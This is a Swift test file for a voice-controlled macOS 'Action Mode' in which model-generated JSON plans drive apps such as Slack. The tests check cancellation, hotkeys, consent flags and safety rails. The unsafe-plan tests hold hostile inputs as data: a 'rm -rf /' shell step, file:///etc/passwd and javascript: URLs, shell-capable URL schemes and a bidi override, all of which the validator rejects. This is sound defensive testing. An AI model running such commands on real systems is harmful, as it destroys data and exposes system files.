        let cancelPlanner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "g", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"},
             {"do":"verify_context","expect":["Himesh"]},
             {"do":"type_text","text":"one"},
             {"do":"verify_context","expect":["Himesh"]},
             {"do":"type_text","text":"two"}]
            """), done: false),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"}]
            """), done: false),
        ])
        let cancelRunner = ActionLoopRunner(host: cancelHost, planner: cancelPlanner,
                                            execute: true, allowSend: false)
        cancelHost.onStep = { step in
            if step == "type(one)" { cancelRunner.cancel() }
        }
        if case .cancelled = cancelRunner.run(transcript: "t",
                                              context: loopContext()) {
            expect(!cancelHost.typed.contains("two"), "cancel stops within the batch")
            expect(cancelPlanner.observations.isEmpty, "a cancelled loop asks no more turns")
            expect(cancelPlanner.ended, "a cancelled loop closes the session")
        } else {
            expect(false, "cancel must end the loop as cancelled")
        }

        // 7b. An engine-side rejection (plan_invalid) is not the end: the
        //     loop asks again with a fresh observation carrying the reason.
        let rejHost = FakeActionHost()
        rejHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        rejHost.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        rejHost.windowTitle = "Himesh Singh (DM) - Slack"
        rejHost.elementLabel = "Message to Himesh Singh"
        let rejPlanner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "draft", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"}]
            """), done: false),
            .failure(reason: "could not plan that action: type_text before "
                        + "any focus checkpoint", code: "plan_invalid"),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"verify_context","expect":["Himesh"]},
             {"do":"type_text","text":"hi"}]
            """), done: true),
        ])
        let rejRunner = ActionLoopRunner(host: rejHost, planner: rejPlanner,
                                         execute: true, allowSend: false)
        if case .completed = rejRunner.run(transcript: "t", context: loopContext()) {
            expect(rejPlanner.observations.count == 2,
                   "the rejection cost one extra ask, not the whole action")
            expect((rejPlanner.observations[1]["failed_step"] as? String)?
                       .contains("rejected") == true,
                   "the next ask names the rejection so the model can react")
            expect(rejHost.typed == ["hi"], "the recovered turn still ran")
        } else {
            expect(false, "a plan_invalid reply must be retried with an observation")
        }

        // 7. done together with final steps completes without another ask.
        let finishHost = FakeActionHost()
        finishHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        finishHost.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        finishHost.windowTitle = "Himesh Singh (DM) - Slack"
        finishHost.elementLabel = "Message to Himesh Singh"
        let finishPlanner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "draft", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"},
             {"do":"verify_context","expect":["Himesh"]},
             {"do":"type_text","text":"on my way"}]
            """), done: true),
        ])
        let finishRunner = ActionLoopRunner(host: finishHost, planner: finishPlanner,
                                            execute: true, allowSend: false)
        if case .completed = finishRunner.run(transcript: "t",
                                              context: loopContext()) {
            expect(finishPlanner.observations.isEmpty,
                   "a final batch marked done skips the extra round-trip")
            expect(finishHost.typed == ["on my way"], "the final steps still ran")
        } else {
            expect(false, "a done-with-steps turn completes the loop")
        }
    }

    // MARK: - Hotkey routing

    /// Action Mode added a third hotkey, which turned the monitor's one
    /// hard-coded "edit" slot into a role table. These cover the routing that
    /// refactor introduced — a chord must reach exactly one feature.
    private static func testSecondaryHotkeyRouting() {
        let monitor = HotkeyMonitor()
        let probe = HotkeySelftestDelegate()
        monitor.delegate = probe
        monitor.hotkey = .rightOption
        monitor.secondaryHotkeys = [
            .edit: .optionShiftE,
            .stream: .controlShiftS,
            .action: .optionShiftA,
        ]

        // Stream Typing has its own independently latched chord.
        expect(monitor.handleKeyDown(
            keyCode: 1, flags: Hotkey.controlShiftS.modifiers,
            isRepeat: false, invalidateContinuation: false),
            "the stream combo is suppressed by a filtering tap")
        expect(waitUntil { probe.streamHotkeyDownCount == 1 },
               "the stream hotkey callback is delivered")
        expect(probe.editHotkeyDownCount == 0 && probe.actionHotkeyDownCount == 0,
               "the stream combo fires no other voice mode")
        expect(monitor.handleKeyUp(keyCode: 1), "the stream key-up is suppressed")
        expect(waitUntil { probe.streamHotkeyUpCount == 1 },
               "the stream key-up is delivered")

        // ⌥⇧A reaches Action Mode, and only Action Mode.
        expect(monitor.handleKeyDown(keyCode: 0, flags: Hotkey.optionShiftA.modifiers,
                                     isRepeat: false, invalidateContinuation: false),
               "the action combo is suppressed by a filtering tap")
        expect(waitUntil { probe.actionHotkeyDownCount == 1 },
               "the action hotkey callback is delivered")
        expect(probe.editHotkeyDownCount == 0, "the action combo never fires Voice Edit")
        expect(monitor.handleKeyUp(keyCode: 0), "the action key-up is suppressed")
        expect(waitUntil { probe.actionHotkeyUpCount == 1 }, "the action key-up is delivered")

        // ⌥⇧E still reaches Voice Edit after the refactor.
        expect(monitor.handleKeyDown(keyCode: 14, flags: Hotkey.optionShiftE.modifiers,
                                     isRepeat: false, invalidateContinuation: false),
               "the edit combo is still suppressed")
        expect(waitUntil { probe.editHotkeyDownCount == 1 },
               "the edit hotkey still works alongside Action Mode")
        expect(probe.actionHotkeyDownCount == 1, "the edit combo never fires Action Mode")
        _ = monitor.handleKeyUp(keyCode: 14)
        expect(waitUntil { probe.editHotkeyUpCount == 1 }, "the edit key-up is delivered")

        // Two roles on one chord resolve deterministically to the first role,
        // rather than firing both features from a single keypress.
        let collided = HotkeyMonitor()
        let collidedProbe = HotkeySelftestDelegate()
        collided.delegate = collidedProbe
        collided.hotkey = .rightOption
        collided.secondaryHotkeys = [.edit: .optionShiftE, .action: .optionShiftE]
        _ = collided.handleKeyDown(keyCode: 14, flags: Hotkey.optionShiftE.modifiers,
                                   isRepeat: false, invalidateContinuation: false)
        expect(waitUntil { collidedProbe.editHotkeyDownCount == 1 },
               "a collided chord fires the first role")
        expect(collidedProbe.actionHotkeyDownCount == 0,
               "a collided chord never fires both features at once")
        _ = collided.handleKeyUp(keyCode: 14)

        // The dictation hotkey outranks a secondary bound to the same chord.
        let shadowed = HotkeyMonitor()
        let shadowedProbe = HotkeySelftestDelegate()
        shadowed.delegate = shadowedProbe
        shadowed.hotkey = .optionShiftA
        shadowed.secondaryHotkeys = [.action: .optionShiftA]
        _ = shadowed.handleKeyDown(keyCode: 0, flags: Hotkey.optionShiftA.modifiers,
                                   isRepeat: false, invalidateContinuation: false)
        expect(waitUntil { shadowedProbe.hotkeyDownCount == 1 },
               "dictation wins when a secondary shares its chord")
        expect(shadowedProbe.actionHotkeyDownCount == 0,
               "the shadowed secondary role stays silent")
        _ = shadowed.handleKeyUp(keyCode: 0)

        // Rebinding one role must not strand a hold in progress on another.
        let rebound = HotkeyMonitor()
        let reboundProbe = HotkeySelftestDelegate()
        rebound.delegate = reboundProbe
        rebound.hotkey = .rightOption
        rebound.secondaryHotkeys = [.edit: .optionShiftE, .action: .optionShiftA]
        _ = rebound.handleKeyDown(keyCode: 14, flags: Hotkey.optionShiftE.modifiers,
                                  isRepeat: false, invalidateContinuation: false)
        expect(waitUntil { reboundProbe.editHotkeyDownCount == 1 }, "the edit hold started")
        rebound.secondaryHotkeys = [.edit: .optionShiftE, .action: .f19]
        expect(rebound.handleKeyUp(keyCode: 14),
               "rebinding Action Mode does not strand an Edit hold mid-press")
        expect(waitUntil { reboundProbe.editHotkeyUpCount == 1 },
               "the stranded-hold guard delivers the edit key-up")
    }

    // MARK: - Settings migration

    private static func testActionShortcutSettingsMigration() {
        // Settings written before Action Mode have no `action` keys. Decoding
        // must fill defaults rather than fail and reset every other preference.
        let legacy = """
        {"dictation":{"keyCode":61,"modifiers":524288,"isModifierOnly":true},
         "editSelection":{"keyCode":14,"modifiers":655360,"isModifierOnly":false},
         "voiceEdit":true,"behavior":"hold"}
        """
        guard let data = legacy.data(using: .utf8),
              let shortcuts = try? JSONDecoder().decode(
                SettingsDocument.Shortcuts.self, from: data) else {
            expect(false, "a pre-Action settings file still decodes")
            return
        }
        expect(shortcuts.dictation == .rightOption, "the existing hotkey survives the upgrade")
        expect(shortcuts.voiceEdit, "the existing Voice Edit preference survives")
        expect(shortcuts.streamTyping == .controlShiftS,
               "a missing Stream Typing hotkey gets the collision-safe default")
        expect(shortcuts.streamTypingEnabled,
               "Stream Typing is on after an upgrade")
        expect(shortcuts.action == SettingsDocument.Shortcuts.defaultActionHotkey,
               "a missing action hotkey defaults to ⌃⇧A")
        expect(shortcuts.actionsEnabled, "Action Mode is on by default after an upgrade")

        let streamDefaultAlreadyUsed = """
        {"dictation":{"keyCode":1,"modifiers":393216,"isModifierOnly":false},
         "editSelection":{"keyCode":14,"modifiers":655360,"isModifierOnly":false},
         "voiceEdit":true,"behavior":"hold",
         "action":{"keyCode":0,"modifiers":393216,"isModifierOnly":false},
         "actionsEnabled":true}
        """
        if let collisionData = streamDefaultAlreadyUsed.data(using: .utf8),
           let collisionSafe = try? JSONDecoder().decode(
                SettingsDocument.Shortcuts.self, from: collisionData) {
            expect(collisionSafe.streamTyping != collisionSafe.dictation,
                   "a pre-Stream shortcut collision receives a deterministic spare")
        } else {
            expect(false, "a pre-Stream settings collision still decodes")
        }

        // And a full round trip keeps a customized binding.
        var custom = SettingsDocument.Shortcuts.defaults
        custom.action = .f19
        custom.actionsEnabled = false
        guard let encoded = try? JSONEncoder().encode(custom),
              let decoded = try? JSONDecoder().decode(
                SettingsDocument.Shortcuts.self, from: encoded) else {
            expect(false, "shortcuts round-trip through JSON")
            return
        }
        expect(decoded == custom, "a customized action hotkey round-trips")
    }

    private static func testStreamDraftRevisionPolicy() {
        var plan = StreamDraftPlan()
        expect(plan.next("hello", ownershipValid: true) == .insert("hello"),
               "a stream draft inserts its first provisional transcript once")
        plan.commit("hello")
        expect(plan.next("hello", ownershipValid: true) == .noChange,
               "an identical provisional transcript is idempotent")
        expect(
            plan.next("hello world", ownershipValid: true)
                == .replace(previous: "hello", with: "hello world"),
            "a newer provisional transcript replaces the exact owned draft")
        plan.commit("hello world")
        expect(plan.next("polished final", ownershipValid: false) == .abandon,
               "cursor or text drift abandons replacement before the final")
        expect(plan.next("anything", ownershipValid: true) == .abandon,
               "an abandoned live range can never be reclaimed blindly")

        expect(
            StreamTypingSession.finishResultForFailedDelivery(
                hadRenderedDraft: false, postedUTF16Units: 1) == .ownershipLost,
            "a failed first write after any posted event never falls back to a second insertion")
        expect(
            StreamTypingSession.finishResultForFailedDelivery(
                hadRenderedDraft: false, postedUTF16Units: 0) == .unavailable,
            "a first write that posted nothing may use final-only fallback")
        expect(
            StreamTypingSession.finishResultForFailedDelivery(
                hadRenderedDraft: true, postedUTF16Units: 0) == .ownershipLost,
            "a failed revision of an existing draft never inserts a duplicate final")
        expect(
            StreamTypingSession.finishResultForFailedDelivery(
                hadRenderedDraft: false,
                postedUTF16Units: 0,
                ownershipStillValid: false) == .ownershipLost,
            "a zero-post first write cannot fall back after its original cursor moved")

        var lostBeforeFirstDraft = StreamDraftPlan()
        expect(
            lostBeforeFirstDraft.next("final", ownershipValid: false) == .abandon
                && lostBeforeFirstDraft.abandonment == .ownershipLost,
            "ownership loss before the first partial is not mistaken for unavailable streaming")

        var failedFirstProvisional = StreamDraftPlan()
        expect(
            failedFirstProvisional.next("partial", ownershipValid: true)
                == .insert("partial"),
            "the failed-first-write fixture begins with a provisional insertion")
        failedFirstProvisional.abandonAfterFailedDelivery(
            postedUTF16Units: 1, ownershipStillValid: false)
        expect(
            failedFirstProvisional.next("polished", ownershipValid: true) == .abandon
                && failedFirstProvisional.abandonment == .ownershipLost,
            "a partial first write remains ownership-lost when the later final arrives")

        var simulatedClipboard = "before"
        StreamFinalOutputStagingPolicy.stage(
            "final", alreadyStaged: false, write: { simulatedClipboard = $0 })
        simulatedClipboard = "new user copy"
        StreamFinalOutputStagingPolicy.stage(
            "final", alreadyStaged: true, write: { simulatedClipboard = $0 })
        expect(
            simulatedClipboard == "new user copy",
            "an asynchronous Stream fallback does not overwrite a newer clipboard copy")

        expect(
            StreamInteractionGate.actionRequestIsBusy(
                phaseIsIdle: true,
                cancellationInFlight: true,
                actionIsRunning: false),
            "Action Mode stays busy until Stream cancellation restoration completes")
        expect(
            !StreamInteractionGate.actionRequestIsBusy(
                phaseIsIdle: true,
                cancellationInFlight: false,
                actionIsRunning: false),
            "Action Mode becomes available after Stream restoration releases ownership")

        expect(
            StreamTypingFinalPolicy.shouldDeferFinal(
                session: "stream-1", cancellationSession: "stream-1"),
            "a final for the restoring Stream session is deferred")
        expect(
            !StreamTypingFinalPolicy.shouldDeferFinal(
                session: "new-session", cancellationSession: "stream-1"),
            "an unrelated final is not captured by an old Stream restoration")
        expect(
            StreamTypingFinalPolicy.restorationDecision(
                originalIsCurrent: false, attemptsRemaining: 2) == .retry
                && StreamTypingFinalPolicy.restorationDecision(
                    originalIsCurrent: true, attemptsRemaining: 1) == .restored,
            "delayed AX restoration retries until the exact original selection appears")
        expect(
            StreamTypingFinalPolicy.restorationDecision(
                originalIsCurrent: false, attemptsRemaining: 0) == .failed
                && !StreamTypingFinalPolicy.commandMayExecute(after: .failed)
                && StreamTypingFinalPolicy.commandMayExecute(after: .noDraft),
            "failed restoration never authorizes a command while a no-draft cancellation can")

        var streamHistoryWrites = 0
        if StreamTypingFinalPolicy.shouldRecordHistory(alreadyRecorded: false) {
            streamHistoryWrites += 1
        }
        // The normal insertion fallback is allowed after final delivery has
        // started, including if cancellation races the AX completion. It must
        // not create a second History row for the already-durable final.
        if StreamTypingFinalPolicy.shouldRecordHistory(alreadyRecorded: true) {
            streamHistoryWrites += 1
        }
        expect(
            streamHistoryWrites == 1,
            "a Stream final is retained exactly once across asynchronous fallback or cancellation")

        let unicode = String(repeating: "a", count: 19) + "🙂" + " suffix"
        let chunks = TextInserter.unicodeTypingChunks(unicode)
        let joined = chunks.flatMap { $0 }
        expect(joined.elementsEqual(unicode.utf16),
               "Unicode typing chunks preserve every UTF-16 unit in order")
        expect(
            chunks.allSatisfy { chunk in
                let decoded = String(decoding: chunk, as: UTF16.self)
                return decoded.utf16.elementsEqual(chunk)
                    && !decoded.contains("\u{FFFD}")
            },
            "Unicode typing never splits an emoji surrogate pair across events")
    }

    // MARK: - CLI / control surface

    private static func testActionCLIParsing() {
        func parse(_ argv: [String]) -> CLICommand? {
            try? CLIInvocation.parse(argv).command
        }
        expect(parse(["action", "open", "WhatsApp"])
               == .action(text: "open WhatsApp", execute: false, allowSend: false),
               "a bare action command plans without executing")
        expect(parse(["action", "open", "WhatsApp", "--execute"])
               == .action(text: "open WhatsApp", execute: true, allowSend: false),
               "--execute opts in to carrying the plan out, but not to sending")
        expect(parse(["action", "message Priya hi", "--allow-send"])
               == .action(text: "message Priya hi", execute: true, allowSend: true),
               "--allow-send is the separate, explicit consent to message someone")
        expect(parse(["action"]) == nil, "action without a command is rejected")
        expect(parse(["action", "--bogus", "x"]) == nil, "unknown options are rejected")

        // The router must refuse an over-long command and an absent capability.
        let directory = FileManager.default.temporaryDirectory
            .appendingPathComponent("velora-action-cli-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(
            at: directory, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: directory) }
        let history = HistoryStore(url: directory.appendingPathComponent("history.sqlite3"))
        let router = LocalControlRouter(
            history: history, accessEnabled: { true }, engineReady: { true },
            typingWPM: { 40 })
        var response: ControlResponse?
        _ = router.handle(ControlRequest(
            id: "1", command: "action", arguments: ["text": "open Slack"])) {
                response = $0
            }
        expect(response?.failure?.code == "capability_unavailable",
               "action is refused when the app exposes no action capability")

        var executed: Bool?
        let live = LocalControlRouter(
            history: history, accessEnabled: { true }, engineReady: { true },
            typingWPM: { 40 },
            action: { arguments, completion in
                executed = arguments["execute"] as? Bool
                completion(.success(["ok": true]))
                return {}
            })
        _ = live.handle(ControlRequest(
            id: "2", command: "action", arguments: ["text": "open Slack"])) { _ in }
        expect(executed == false, "the router defaults to planning, never executing")
        var sendOK: Bool?
        let sendRouter = LocalControlRouter(
            history: history, accessEnabled: { true }, engineReady: { true },
            typingWPM: { 40 },
            action: { arguments, completion in
                sendOK = arguments["allow_send"] as? Bool
                completion(.success(["ok": true]))
                return {}
            })
        _ = sendRouter.handle(ControlRequest(
            id: "s1", command: "action",
            arguments: ["text": "message Priya", "execute": true])) { _ in }
        expect(sendOK == false,
               "executing does not by itself permit a plan that messages someone")
        _ = live.handle(ControlRequest(
            id: "3", command: "action",
            arguments: ["text": "open Slack", "execute": true])) { _ in }
        expect(executed == true, "an explicit execute flag reaches the app")

        var tooLong: ControlResponse?
        _ = live.handle(ControlRequest(
            id: "4", command: "action",
            arguments: ["text": String(repeating: "x",
                                       count: LocalControlRouter
                                           .maxActionCommandCharacters + 1)])) {
                tooLong = $0
            }
        expect(tooLong?.failure?.code == "invalid_arguments",
               "an over-long action command is rejected before it reaches the app")

        var denied: ControlResponse?
        let locked = LocalControlRouter(
            history: history, accessEnabled: { false }, engineReady: { true },
            typingWPM: { 40 },
            action: { _, completion in completion(.success(["ok": true])); return {} })
        _ = locked.handle(ControlRequest(
            id: "5", command: "action", arguments: ["text": "open Slack"])) { denied = $0 }
        expect(denied?.failure?.code == "access_disabled",
               "actions are refused while local agent access is off")
    }

    // MARK: - Plan decoding

    private static func testActionPlanDecoding() {
        guard let plan = decodePlan(slackPlanJSON) else {
            expect(false, "the Slack plan decodes")
            return
        }
        expect(plan.steps.count == 11, "all eleven steps decode")
        expect(plan.sends, "the Slack plan is marked as sending")
        expect(plan.goal == "message Himesh", "the goal survives decoding")
        expect(plan.steps.first == .openApp("Slack"), "first step is open_app Slack")
        expect(plan.steps[1] == .waitFrontmost(app: "Slack",
                                               timeoutMs: ActionPlan.Limits.defaultWaitMs),
               "wait_frontmost gets the default timeout")
        expect(plan.steps[2] == .key(name: "k", mods: ["cmd"], repeatCount: 1),
               "⌘K decodes with its modifier")

        let unsupported = decodePlan("""
        {"unsupported":"Photoshop isn't installed"}
        """)
        expect(unsupported?.unsupported == "Photoshop isn't installed",
               "an unsupported plan carries its reason")
        expect(unsupported?.isExecutable == false, "an unsupported plan never executes")

        // Fail safe: a plan that forgets to mark itself is treated as sending,
        // so the confirmation surface still appears.
        let unmarked = decodePlan("""
        {"steps":[{"do":"open_app","app":"Slack"}]}
        """)
        expect(unmarked?.sends == true, "an unmarked plan is assumed to send")

        // Modifier spellings a small model actually produces.
        let aliases = decodePlan("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"K","mods":["Command","Shift"]}]}
        """)
        expect(aliases?.steps.last == .key(name: "k", mods: ["cmd", "shift"], repeatCount: 1),
               "'Command' normalizes to cmd and the key lowercases")

        let clamped = decodePlan("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack","timeout_ms":999999},
          {"do":"type_text","text":"hi"}]}
        """)
        expect(clamped?.steps.first == .waitFrontmost(app: "Slack",
                                                      timeoutMs: ActionPlan.Limits.maxWaitMs),
               "an absurd wait timeout is clamped, not honoured")
    }

    private static func testActionPlanRejectsUnsafePlans() {
        // The engine validates first; this mirror is what stops a plan that
        // reached the app by any other route.
        expect(decodePlanError("""
        {"steps":[{"do":"run_shell","cmd":"rm -rf /"}]}
        """) == .unknownVerb("run_shell"), "there is no shell verb")

        expect(decodePlanError("""
        {"steps":[{"do":"open_url","url":"file:///etc/passwd"}]}
        """) != nil, "file:// links are rejected")

        expect(decodePlanError("""
        {"steps":[{"do":"open_url","url":"javascript:alert(1)"}]}
        """) != nil, "javascript: links are rejected")

        expect(decodePlanError("""
        {"steps":[{"do":"open_app","app":"Slack"},{"do":"type_text","text":"hello"}]}
        """) == .inputBeforeFocus(step: 1),
        "typing without a focus checkpoint is rejected — this is the rail that "
            + "stops a message landing in the wrong window")

        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"line one\\nline two"}]}
        """) == .newlineInText(step: 1),
        "a newline inside typed text is rejected — in a chat composer it is a send")

        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},{"do":"key","key":"banana"}]}
        """) == .unknownKey("banana"), "unknown key names are rejected")

        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"down","repeat":500}]}
        """) == .repeatOutOfRange(500), "a runaway key repeat is rejected")

        expect(decodePlanError("{\"steps\":[]}") == .noSteps, "an empty plan is rejected")

        // The wrong-recipient class, caught by adversarial review: the Slack
        // recipe used to press Return (selecting from the quick switcher)
        // BEFORE verifying. If ⌘K was swallowed — a cold-launched app that
        // isn't input-ready yet — the recipient's name goes into the
        // conversation already on screen and that Return sends it to the wrong
        // person. Verifying afterwards is verifying too late.
        expect(decodePlanError("""
        {"steps":[{"do":"open_app","app":"Slack"},
          {"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"k","mods":["cmd"]},
          {"do":"type_text","text":"Himesh"},
          {"do":"key","key":"return"}]}
        """) == .unverifiedSend(step: 4),
        "a Return that commits typed text needs a verify_context before it")

        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hi"},
          {"do":"key","key":"k","mods":["cmd"]}]}
        """) == nil, "a MODIFIED key after typing is a shortcut, not a send")

        // A one- or two-character term matches nearly any window title, and
        // "Slack" is in every Slack window: neither can carry a verification.
        for weak in ["a", "Jo", "-"] {
            expect(decodePlanError("""
            {"steps":[{"do":"wait_frontmost","app":"Slack"},
              {"do":"verify_context","expect":["\(weak)"]},
              {"do":"type_text","text":"hi"}]}
            """) == .weakVerifyTerm(weak),
            "'\(weak)' alone is too weak to be a verification")
        }
        expect(decodePlanError("""
        {"steps":[{"do":"open_app","app":"Slack"},
          {"do":"wait_frontmost","app":"Slack"},
          {"do":"verify_context","expect":["Slack"]},
          {"do":"type_text","text":"hi"}]}
        """) == .weakVerifyTerm("Slack"),
        "the app's own name alone cannot serve as the verification")

        // But a weak term BESIDE a real one is dropped, not fatal. Found in the
        // field: "draft a message to Himesh on Slack, say Hi" planned correctly
        // and was then thrown away over the "Hi".
        if let mixed = decodePlan("""
        {"sends":false,"steps":[{"do":"open_app","app":"Slack"},
          {"do":"wait_frontmost","app":"Slack"},
          {"do":"verify_context","expect":["Himesh","Hi","Slack"]},
          {"do":"type_text","text":"Hi"}]}
        """) {
            expect(mixed.steps[2] == .verifyContext(anyOf: ["Himesh"]),
                   "the weak terms are dropped and the identifying one survives")
        } else {
            expect(false, "a plan mixing weak and strong verify terms still decodes")
        }

        // `shortcuts://run-shortcut` runs a user Shortcut, which can contain a
        // Run Shell Script action — a shell step by another name.
        for scheme in ["shortcuts", "raycast", "obsidian", "things", "vscode", "cursor"] {
            expect(decodePlanError("""
            {"steps":[{"do":"open_url","url":"\(scheme)://run?x=1"}]}
            """) != nil, "\(scheme): links are not in the allowlist")
        }

        // JSON `true` bridges to 1 through NSNumber; a repeat count must be a
        // real number, matching the engine's explicit bool rejection.
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"down","repeat":true}]}
        """) != nil, "a boolean repeat count is rejected, as in the engine")

        let manySteps = (0..<(ActionPlan.Limits.maxSteps + 1))
            .map { _ in "{\"do\":\"pause\",\"ms\":10}" }.joined(separator: ",")
        expect(decodePlanError("{\"steps\":[\(manySteps)]}") != nil,
               "the step cap is enforced")

        let longText = String(repeating: "x", count: ActionPlan.Limits.maxTextChars + 1)
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},{"do":"type_text","text":"\(longText)"}]}
        """) != nil, "the per-step text cap is enforced")

        // A bidi override makes a preview read differently from what is typed.
        let sneaky = decodePlan("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"pay \\u202eyalp"}]}
        """)
        if case .typeText(let text)? = sneaky?.steps.last {
            expect(!text.unicodeScalars.contains { $0.value == 0x202E },
                   "bidi overrides are stripped from typed text")
        } else {
            expect(false, "the sanitized text step still decodes")
        }
    }

    private static func testActionKeyVocabulary() {
        expect(ActionKey.keyCode(for: "return") == 36, "return maps to keycode 36")
        expect(ActionKey.keyCode(for: "escape") == 53, "escape maps to keycode 53")
        expect(ActionKey.keyCode(for: "banana") == nil, "unknown names map to nil")
        expect(ActionKey.keyCode(for: "k") != nil, "letter keys resolve")
        expect(ActionKey.keyCode(for: "K") != nil, "key names are case-insensitive")
        expect(ActionKey.keyCode(for: "comma") != nil, "punctuation names resolve")
        expect(ActionKey.keyCode(for: "f12") == 111, "function keys resolve")
        expect(ActionModifier.flags(for: ["cmd", "shift"])
               == [.maskCommand, .maskShift], "modifier flags combine")
        expect(ActionModifier.flags(for: ["nonsense"]).isEmpty,
               "unknown modifiers contribute no flags")
        // Every name the engine may emit must map, or a plan dies mid-flight.
        for name in ActionKey.allNames {
            expect(ActionKey.keyCode(for: name) != nil, "'\(name)' maps to a keycode")
        }
    }

    private static func testAppMatching() {
        let running = ["Finder", "Google Chrome", "\u{200E}WhatsApp", "Messages",
                       "Sublime Text", "Slack"]
        func match(_ query: String) -> String? {
            AppMatcher.bestMatch(for: query, in: running).map { running[$0] }
        }
        expect(match("Slack") == "Slack", "exact names match")
        expect(match("chrome") == "Google Chrome", "'chrome' finds Google Chrome")
        // Verified on this machine: WhatsApp's localizedName carries a leading
        // U+200E, so a plain == against "WhatsApp" is false.
        expect(match("WhatsApp") == "\u{200E}WhatsApp",
               "an invisible mark in the app's name does not break matching")
        expect(match("Messages") == "Messages", "Messages is not captured by a longer name")
        expect(match("Photoshop") == nil, "absent apps do not match")
        expect(match("go") == nil, "a two-letter query does not select by substring")

        expect(AppMatcher.contextMatches(["Himesh"], in: ["Himesh Singh (DM) - Slack"]),
               "a window title satisfies a verify term")
        expect(AppMatcher.contextMatches(["himesh"], in: [nil, "Message Himesh"]),
               "a focused-element label satisfies a verify term")
        expect(!AppMatcher.contextMatches(["Himesh"], in: ["Priya - Slack"]),
               "the wrong conversation fails verification")
        expect(!AppMatcher.contextMatches(["Himesh"], in: [nil, nil]),
               "unreadable context fails closed, never open")

        // Substring matching would confirm the wrong human: ask to message
        // Priya, let the switcher land on Priyanka, and a `contains` test says
        // yes. Matching is whole-word for exactly this reason.
        expect(!AppMatcher.contextMatches(["Priya"], in: ["Priyanka Menon (DM) - Slack"]),
               "a name that is a PREFIX of another person's name does not verify")
        expect(AppMatcher.contextMatches(["Priya"], in: ["Priya Menon (DM) - Slack"]),
               "the actual person still verifies")
        expect(AppMatcher.contextMatches(["Himesh Singh"], in: ["Himesh Singh (DM)"]),
               "a multi-word term matches a consecutive run of words")
        expect(!AppMatcher.contextMatches(["Himesh Singh"], in: ["Singh Himesh"]),
               "a multi-word term does not match its words out of order")

        // Every term must match. With any-of semantics one generic term could
        // carry a whole plan past the check.
        expect(!AppMatcher.contextMatches(["Himesh", "Slack"], in: ["Priya - Slack"]),
               "one satisfied term out of two is not a verification")
        expect(AppMatcher.contextMatches(["Himesh", "DM"], in: ["Himesh Singh (DM) - Slack"]),
               "all terms present verifies")
    }

    // MARK: - Executor

    private static func testActionExecutorHappyPath() {
        let host = FakeActionHost()
        host.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        host.windowTitle = "Himesh Singh (DM) - Acme - Slack"
        host.elementLabel = "Message Himesh Singh"
        guard let plan = decodePlan(slackPlanJSON) else {
            expect(false, "plan decodes for the executor test")
            return
        }
        let result = ActionExecutor(host: host).run(plan)
        expect(result.outcome == .completed, "the Slack plan runs to completion")
        expect(host.typed == ["Himesh", "running five late"],
               "the name and the message are typed in order")
        expect(host.keys.count == 3, "⌘K plus two Returns are pressed")
        expect(host.keys.first?.1 == .maskCommand, "the first keystroke carries ⌘")

        // A draft opens the conversation by pressing the row — the only
        // Return-free path, because a draft may never commit pending text.
        let draftJSON = slackDraftPlanJSON
        let draftHost = FakeActionHost()
        draftHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        draftHost.windowTitle = "Himesh Singh (DM) - Slack"
        draftHost.pressableLabels = ["Himesh Singh"]
        if let draft = decodePlan(draftJSON) {
            let draftResult = ActionExecutor(host: draftHost).run(draft)
            expect(draftResult.outcome == .completed, "the draft plan completes")
            expect(draftHost.keys.count == 1,
                   "a draft presses only ⌘K — no Return anywhere")
            expect(draftHost.pressedLabels == ["Himesh Singh"],
                   "the conversation opens via the pressed row")
        } else {
            expect(false, "the draft plan decodes")
        }

        // A URL plan needs no focus at all.
        let searchHost = FakeActionHost()
        if let search = decodePlan("""
        {"goal":"search","sends":false,"steps":[
          {"do":"open_url","url":"https://www.youtube.com/results?search_query=football"}]}
        """) {
            expect(ActionExecutor(host: searchHost).run(search).outcome == .completed,
                   "a search plan is one URL step")
            expect(searchHost.openedURLs.first?.query == "search_query=football",
                   "the search query reaches the URL")
        } else {
            expect(false, "the search plan decodes")
        }
    }

    private static func testActionExecutorSafetyRails() {
        guard let plan = decodePlan(slackPlanJSON) else {
            expect(false, "plan decodes for the safety tests")
            return
        }

        // 1. The app never comes to the front → stop before any typing.
        let stuck = FakeActionHost()
        stuck.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        stuck.frontmost = ("Sublime Text", "com.sublimetext.4")
        stuck.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        stuck.frontmostAfterReads = (reads: 0, value: ("Sublime Text", "com.sublimetext.4"))
        let stuckResult = ActionExecutor(host: stuck).run(plan)
        expect(stuckResult.outcome == .failed(step: 1,
                                              reason: "Slack didn't come to the front",
                                              recoverable: true),
